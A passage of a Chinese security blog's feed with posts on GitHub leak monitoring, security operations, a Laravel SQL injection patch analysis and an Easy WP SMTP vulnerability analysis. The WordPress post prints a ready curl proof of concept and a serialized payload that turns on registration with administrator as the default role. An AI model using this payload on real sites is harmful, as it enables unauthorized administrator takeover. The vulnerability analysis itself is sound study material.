&lt;p&gt;规则配置可以是多样化的，比如类github平台定期巡检，更新触发扫描，主动扫描检查。&lt;/p&gt;

&lt;p&gt;多少时间没响应，会自动再次触发报警推送，多种方式报送警报消息。&lt;/p&gt;

&lt;p&gt;制定repo或者author白名单，避免更多的误报。&lt;/p&gt;

&lt;p&gt;优化读取的内容，指定显示关键词前后文行数。&lt;/p&gt;

&lt;p&gt;设置关键词权重，避免大量冗余数据掩盖了低频高危数据。&lt;/p&gt;

&lt;h4 id=&quot;污点化&quot;&gt;污点化&lt;/h4&gt;

&lt;p&gt;在为了防止企业git项目被泄露到公网，我们在命名规范时，可以尝试制定编码规范，必须带上容易识别的特征，或者带上关键词。&lt;/p&gt;

&lt;p&gt;这样有个好处，在代码泄露时能及时监控到，但防君子不防小人，内部人员可能会做关键词替换。但这种情况，也可以通过一些特殊技巧去提升保密性。&lt;/p&gt;

&lt;p&gt;另外，白帽子提交速度可能比监控响应更快，这就需要考验规范制定者的素质了。&lt;/p&gt;

&lt;h4 id=&quot;参考文章&quot;&gt;参考文章&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/150638.html&quot;&gt;深入分析一款简单的Github信息泄露爬虫&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/xpx1995/article/details/79031397&quot;&gt;Github代码高级搜索小技巧&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/sectool/114017.html&quot;&gt;基于Github的源码白盒扫描工具Raptor&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/column/178342.html&quot;&gt;Github信息泄露专项&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="operation" /><summary type="html">笔者原来在涉猎git监控产品时，就只做了敏感关键词监控。后来在工作中逐渐发现，对于一般量级的企业单位，其实复合型的监控平台更符合这类企业的需求。</summary></entry><entry><title type="html">安全运维优化思考</title><link href="/operation/2019/07/13/sec-operation/" rel="alternate" type="text/html" title="安全运维优化思考" /><published>2019-07-13T23:40:00+08:00</published><updated>2019-07-13T23:40:00+08:00</updated><id>/operation/2019/07/13/sec-operation</id><content type="html" xml:base="/operation/2019/07/13/sec-operation/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;近期由乙方安服实验室，转入了甲方的业务安全部门。在接触了一部分业务安全的运维工作后，也做了些对于自身工作的优化方向的思考。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h4 id=&quot;资产统计与变更&quot;&gt;资产统计与变更&lt;/h4&gt;
&lt;p&gt;这段时间正好碰上了FastJson漏洞爆发。由于笔者所在的甲方，属于有一定规模的互联网公司，所以近期也在连夜配合各业务部门进行漏洞修补。&lt;/p&gt;

&lt;p&gt;虽然公司本身具有强大的统计平台，也具有较为成熟的资产规范，但还是花了大量时间去统计、升级那些受影响的资产。&lt;/p&gt;

&lt;p&gt;举个例子，自家公司的It资产已经接入了自动化运维，采用了基于的ES集群的平台。资产的变更能够及时以*key为基准，计入全局搜索，方便以后搜索和资产统计，以及后续的自动化升级和部署。&lt;/p&gt;

&lt;p&gt;但这种统一部署变更的法子，也存在部分痛点。其中的一个就是，一旦基于ES部署平台和Agent自身存在问题，如果没有得到及时修复的话，其自身不小的体量，可能会影响全局资产的修复进度。&lt;/p&gt;

&lt;p&gt;因此，拥有多份资产升级/变更/检测方案，能做到轻量/重量级方案互相制约，窃以为还是有必要的。&lt;/p&gt;

&lt;p&gt;另外，如果做好了内网Git资产梳理，通过代码扫描定位可能存在的漏洞和服务，也是能辅助统计受影响的资产的。&lt;/p&gt;

&lt;h4 id=&quot;自动化检测认证&quot;&gt;自动化检测认证&lt;/h4&gt;
&lt;p&gt;对于大型甲方，如果安全团队在研究好新出的漏洞Poc，对IT资产安全进行自检的时候，如果按正常流程去做，可能首先应该是先进行任务申请上报，然后向全集团发邮件，最后再进行扫描。&lt;/p&gt;

&lt;p&gt;不过，在碰上比较紧急的漏洞应急时，在跨部门协作的情况下，经常会来不及走完所有流程。&lt;/p&gt;

&lt;p&gt;笔者也曾见过研发、运维等部门，因为突然查到攻击Log，半夜一惊一乍的，去找安全部门验证攻击来源是否属于内部自检。&lt;/p&gt;

&lt;p&gt;那么针对这一点，如何做去做优化呢？&lt;/p&gt;

&lt;p&gt;不少大型企业，有时会采用统一的签名和加密机制，或者直接构建单独的平台，用于保证传输加密的可信认证。&lt;/p&gt;

&lt;p&gt;笔者窃以为，这点是可以借鉴的。如果能做好一定范围内的成本控制，在每次做自动化安全检测的时候，将加密认证信息加入检测数据包头部，以用作内部安全检测的授信，各个BU会更加轻松的识别出真实的攻击事件。&lt;/p&gt;

&lt;h4 id=&quot;敏感数据泄漏控制&quot;&gt;敏感数据泄漏控制&lt;/h4&gt;
&lt;p&gt;防止敏感数据的泄漏，以及进行事后的责任追溯，一直是甲方比较重视的点，据悉大致有这样几种方案：&lt;/p&gt;

&lt;p&gt;1.DLP数据防泄漏&lt;/p&gt;

&lt;p&gt;DLP软件一般是为了定位公司敏感数据外发行为，对于数据流量内容进行监控审计，现在市面上也有了不少成熟的合规产品。&lt;/p&gt;

&lt;p&gt;2.堡垒机&lt;/p&gt;

&lt;p&gt;堡垒机上具有监控，限制数据传输和全程录屏等功能，配合查询系统的水印功能，也能在一定程度上防止数据泄漏，以及对泄漏源进行追溯。&lt;/p&gt;

&lt;p&gt;3.数据脱敏&lt;/p&gt;

&lt;p&gt;在存储和展示敏感数据的时候，本身应该做好脱敏操作，对于数据进行加密存储和非完全展示，防止内鬼和意外泄漏事件发生。&lt;/p&gt;

&lt;p&gt;4.数据监控&lt;/p&gt;

&lt;p&gt;虽然如同Github监控和舆情监控一般的产品，并不能有效抑制数据泄漏。但在防止数据扩散，以及追溯数据泄漏来源的层面来看，还是比较有用的。&lt;/p&gt;

&lt;p&gt;如果能综合利用多类产品，再加上企业本身的安全管理规范，应该是能够在一定程度上保证数据安全的。&lt;/p&gt;

&lt;h4 id=&quot;产品检测流程&quot;&gt;产品检测流程&lt;/h4&gt;
&lt;p&gt;在原来的乙方安全测试岗位，如果需要对产品做安检的时候，随便去咨询个资深的相关产品、售前或者研发，基本上都能问出个所以然来。&lt;/p&gt;

&lt;p&gt;然而到了现在的甲方安全运维岗，可就厉害了。在工作流程细化和文档化以后，需要做安全检测时，得挨个询问多个QA/RD/PM，一点一点把他们的需求和设计方案抠出来，最后还得去找API文档自己做补充和完善，才能进行下一步的操作。&lt;/p&gt;

&lt;p&gt;笔者这两天还去拜访了一家非互联网甲方，跟那边负责安全的Leader朋友聊了下，产品上线合规的紧要性，确实是远优先于安全合规的，当然这个也是不得已而为之。&lt;/p&gt;

&lt;p&gt;总的来说，合规化有益于流程梳理，简化有益于加速产品上线，也算各有各的好处吧。&lt;/p&gt;

&lt;p&gt;当然笔者见识有限，窥一斑而不得见全豹。但总的来说，确实可以根据不同产品的实际情况，去对流程进行一些灵活变通。&lt;/p&gt;

&lt;h4 id=&quot;后记&quot;&gt;后记&lt;/h4&gt;
&lt;p&gt;以上只是简单谈了一些感受，这方面的工作资历尚浅，期待各路读者斧正和指教。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="operation" /><summary type="html">近期由乙方安服实验室，转入了甲方的业务安全部门。在接触了一部分业务安全的运维工作后，也做了些对于自身工作的优化方向的思考。</summary></entry><entry><title type="html">PHP开发框架LaravelのSQL注入漏洞分析</title><link href="/bug/2019/03/26/php-framework-Laravel-sqli/" rel="alternate" type="text/html" title="PHP开发框架LaravelのSQL注入漏洞分析" /><published>2019-03-26T19:07:00+08:00</published><updated>2019-03-26T19:07:00+08:00</updated><id>/bug/2019/03/26/php-framework-Laravel-sqli</id><content type="html" xml:base="/bug/2019/03/26/php-framework-Laravel-sqli/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;PHP开发框架Laravel，前几天在官方博客通报了一个SQL注入漏洞，这里简单分析下。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;首先，这个漏洞属于网站coding写法不规范，官方给了提示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/697f6f27ly1g1gby7vp5qj20hx03ht8x.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但官方还是做了修补，升级最新版本V5.8.7可修复。&lt;/p&gt;

&lt;p&gt;我们先定位下这里：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Illuminate\Validation\Rule
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;官方推荐的写法是：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Rule::unique('users')-&amp;gt;ignore($id),
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;但如果网站没有预先对$id的值做处理时，用户可以传递恶意数据给ignore函数，就会导致SQL注入。&lt;/p&gt;

&lt;p&gt;我们来跟一下函数：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\Illuminate\Validation\Rules\Unique.php

class Unique
{
...
public function ignore($id, $idColumn = null)
    {
        if ($id instanceof Model) {
            return $this-&amp;gt;ignoreModel($id, $idColumn);
        }

        $this-&amp;gt;ignore = $id;
        $this-&amp;gt;idColumn = $idColumn ?? 'id';

        return $this;
    }

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里我们不考虑把$id写成实例的情况，$id是用户可控的话，$idColumn直接写为空即可，最后赋值情况如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$this-&amp;gt;ignore = $id;
$this-&amp;gt;idColumn = 'id';
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;如果网站代码类似这样构造的话，黑客输入的值就属于可控状态：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$id = $request-&amp;gt;input('id');
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;最后我们会走到这儿：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Illuminate\Validation\Rules\Unique.php

    public function __toString()
    {
        ...
        ...
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;我们看下关键的代码变更：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Illuminate\Validation\Rules\Unique.php

V5.8.7【最新版】
    public function __toString()
    {
            $this-&amp;gt;ignore ? '&quot;'.addslashes($this-&amp;gt;ignore).'&quot;' : 'NULL',
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Illuminate\Validation\Rules\Unique.php

V5.8.4
    public function __toString()
    {

            $this-&amp;gt;ignore ? '&quot;'.$this-&amp;gt;ignore.'&quot;' : 'NULL',

    }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里最新的代码v5.8.7，把$this-&amp;gt;ignore直接给addslashes了，以前这里是没有防护的。&lt;/p&gt;

&lt;p&gt;有趣的是，笔者对比了下diff，期间官方还试图对其他引用的地方进行了过滤。最后还是改成了__toString处，进行统一过滤的方式。&lt;/p&gt;

&lt;p&gt;最后提一句，后面的代码会进入DatabaseRule，进行后续SQL规则匹配。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Illuminate\Validation\Rules\DatabaseRule.php
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这之后就没有再进一步处理，接着形成了SQL注入。&lt;/p&gt;

&lt;p&gt;参考链接：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.laravel.com/unique-rule-sql-injection-warning?fbclid=IwAR26Cs1Ewh983UxSF5fNO8Xr0hUnwSO_Ikbr08Adi20m5h5llP0WhNDmgRg&quot;&gt;官方通告&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://laravel.com/docs/5.8/validation#rule-unique&quot;&gt;说明文档&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="bug" /><summary type="html">PHP开发框架Laravel，前几天在官方博客通报了一个SQL注入漏洞，这里简单分析下。</summary></entry><entry><title type="html">WordPress Easy WP SMTP反序列化漏洞分析</title><link href="/bug/2019/03/24/unserialize-vuln-for-wp-plugin-easy-wp-smtp/" rel="alternate" type="text/html" title="WordPress Easy WP SMTP反序列化漏洞分析" /><published>2019-03-24T16:31:21+08:00</published><updated>2019-03-24T16:31:21+08:00</updated><id>/bug/2019/03/24/unserialize-vuln-for-wp-plugin-easy-wp-smtp</id><content type="html" xml:base="/bug/2019/03/24/unserialize-vuln-for-wp-plugin-easy-wp-smtp/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;Wordpress插件Easy WP SMTP最近新出了个漏洞，以前有关注过，好像新的代码变化有点大，所以这里花了点时间简单分析下。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;首先，这个漏洞存在于版本v1.3.9。 我这里能下到最接近的老版本是v1.3.8，可惜v1.3.9更迭了一些重要代码，我找到的版本，应该不能复现这个漏洞。
下面我会根据网上一些细节进行分析，没耐心的大佬可以直接跳到最后看原版的分析。&lt;/p&gt;

&lt;p&gt;关键函数位置在：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wp-content/plugins/easy-wp-smtp/easy-wp-smtp.php::admin_init
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里的函数，可以在用户登入admin界面时进行hook，本来是用来查看删除日志，导入/删除/更新数据库里的配置的。&lt;/p&gt;

&lt;p&gt;然而他这里没有对用户权限做严格的验证，甚至没有认证过的游客一样可以触发这个漏洞。
/wp-admin/admin.php的注释里对admin_init解释道：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Note, this does not just run on user-facing admin screens. It runs on admin-ajax.php and admin-post.php as well.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;我们这里在admin-ajax.php处，为了触发漏洞，发送了action=swpsmtp_clear_log的ajax交互请求：&lt;/p&gt;

&lt;p&gt;网上给出的poc：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl https://VICTIM.COM/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt'

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;网上的poc是利用函数中的一个导入配置文件的功能：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$in_raw = file_get_contents( $_FILES[ 'swpsmtp_import_settings_file' ][ 'tmp_name' ] );
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;在导入以后，他会对文件内容进行一个反序列化解析：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$in = unserialize( $in_raw );
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;我们可以使用下面的array:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;users_can_register&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(1)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;default_role&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(13)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;administrator&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;序列化以后成为：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;a:2:{s:18:&quot;users_can_register&quot;;s:1:&quot;1&quot;;s:12:&quot;default_role&quot;;s:13:&quot;administrator&quot;;}&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;再次组合array：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(81)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;a:2:{s:18:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;users_can_register&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;s:1:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;s:12:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;default_role&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;s:13:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;administrator&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;}&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;checksum&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(32)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;3ce5fb6d7b1dbd6252f4b5b3526650c8&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;第二次序列化后，将下面的结果，存入我们要上传的文件/tmp/upload.txt里：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a:2:{s:4:&quot;data&quot;;s:81:&quot;a:2:{s:18:&quot;users_can_register&quot;;s:1:&quot;1&quot;;s:12:&quot;default_role&quot;;s:13:&quot;administrator&quot;;}&quot;;s:8:&quot;checksum&quot;;s:32:&quot;3ce5fb6d7b1dbd6252f4b5b3526650c8&quot;;}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;简单说下，为何要这么构造呢，因为我们的插件代码里有这么一段：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$in = unserialize( $in_raw );
if ( empty( $in[ 'data' ] ) ) {
	 echo $err_msg;
	 wp_die();
}
if ( empty( $in[ 'checksum' ] ) ) {
	 echo $err_msg;
	 wp_die();
}
if ( md5( $in[ 'data' ] ) !== $in[ 'checksum' ] ) {
	 echo $err_msg;
	 wp_die();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;我们可以看到，需要绕过两个部分：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unserialize( $in_raw );
unserialize( $in['data'] )
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;经过两次反序列化的结果后，data的内容，也就是下面的数组：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;users_can_register&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(1)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;default_role&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(13)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;administrator&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;才能分拆为key-value，进入后续函数：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;foreach ( $data as $key =&amp;gt; $value ) 
{
	    update_option( $key, $value );
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;users_can_register是配置的注册启用选项，default_role是默认普通权限，administrator是管理权限。
到这里就明了了，开启注册后，我们注册的普通用户都是管理权限，没必要去取原来的管理密码，反正也解不出来…&lt;/p&gt;

&lt;p&gt;下面我们可以跟到更新数据库配置的位置，这就已经到主branch了：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/wp-includes/option.php::update_option
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;我们可以看到，里面的key，value的值经过下面的函数过滤，对序列化和拼接做了限制，再者使用的$wpdb进行sql执行update，可以操作的地方就比较有限了：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$value = apply_filters( &quot;pre_update_option_{$option}&quot;, $value, $old_value, $option );
$value = apply_filters( 'pre_update_option', $value, $option, $old_value );
	
if ( $value === $old_value || maybe_serialize( $value ) === maybe_serialize( $old_value ) ) 
{
	return false;
}

$result = $wpdb-&amp;gt;update( $wpdb-&amp;gt;options, $update_args, array( 'option_name' =&amp;gt; $option ) );
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;附上数据库wp_options表查询的最初始的默认结果：
&lt;img src=&quot;http://ww1.sinaimg.cn/large/697f6f27ly1g1agtwdr61j210i0dujsn.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;本文可能略显啰嗦，只是为了给小白解释的清楚些，大佬们见谅。&lt;/p&gt;

&lt;p&gt;引用文章：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.nintechnet.com/critical-0day-vulnerability-fixed-in-wordpress-easy-wp-smtp-plugin/&quot;&gt;Critical zero-day vulnerability fixed in WordPress Easy WP SMTP plugin.&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="bug" /><summary type="html">Wordpress插件Easy WP SMTP最近新出了个漏洞，以前有关注过，好像新的代码变化有点大，所以这里花了点时间简单分析下。</summary></entry><entry><title type="html">分布式扫描填坑杂谈</title><link href="/scanner/2019/01/15/talk-about-scanner-settings/" rel="alternate" type="text/html" title="分布式扫描填坑杂谈" /><published>2019-01-15T15:49:21+08:00</published><updated>2019-01-15T15:49:21+08:00</updated><id>/scanner/2019/01/15/talk-about-scanner-settings</id><content type="html" xml:base="/scanner/2019/01/15/talk-about-scanner-settings/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;前段时间团队新加了几台服务器，因为现行的扫描器是支持分布式的，所以及时进行了分布式部署。结果在调试分布式配置时，还是遇到许多坑，忙完一阵子闲下来了，正好整理下记录。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;在本文中，将简单谈谈我这边采用的技术栈，有关对分布式填坑的经历，大家注意这里依旧是采用的python code。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;celery库版本&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以root权限启动root的问题，低版本不识别，会报错，这里使用的是celery==3.1.2x。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from celery import Celery, platforms
platforms.C_FORCE_ROOT = True

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;redis库版本&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;版本不合适，或者worker和server版本不对等的话，可能出现celery worker 开启不久就offline的问题，或者redis会不时的掉线重连。&lt;/p&gt;

&lt;p&gt;这里把redis库的版本，从原来的redis==3.0.x降级到redis==2.10.x，基本解决了上述bug。&lt;/p&gt;

&lt;p&gt;需要注意的是，在celery高版本的时候（比如4.x），可能会需要匹配3.x的redis库，大家看情况而定。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;重连机制&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我们这里在后端存储结果，考虑到复杂sql交叉调用，还是采用的关系数据库mysql。&lt;/p&gt;

&lt;p&gt;局域网中数据库写入，需要考虑重连机制，常用的如MySQLdb库，原生无重连机制，需要自己重写。&lt;/p&gt;

&lt;p&gt;这里推荐两个模块，都支持重连：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;torndb
facebook开源的一个基于MySQLdb二次封装的一个mysql模块。
pymysql
比较常用，需要python3。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;加强存取稳定性&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果想要加强局域网数据存取的稳定性，除了把上述的超时和重连配置好以外，暂时有两个办法：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;第一：可以将存入局域网数据库服务器失败的数据，暂存本地关系数据库。采用定时调度器，或者监控网络空闲时，再进行同步
。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;第二：可以将命令或者数据直接写入本地中间件，当监控到网络空闲时间，自动同步。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;另外，笔者这方面经验比较浅，欢迎运维大佬和coding大佬多多指教下这一块儿有没有其他可优化的点。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;局域网调试&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;检测网络状态，可以看出ping其他worker是通的：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; app = Celery('test', backend='redis://random_host:6379/0', broker='redis://random_host:6379/0')
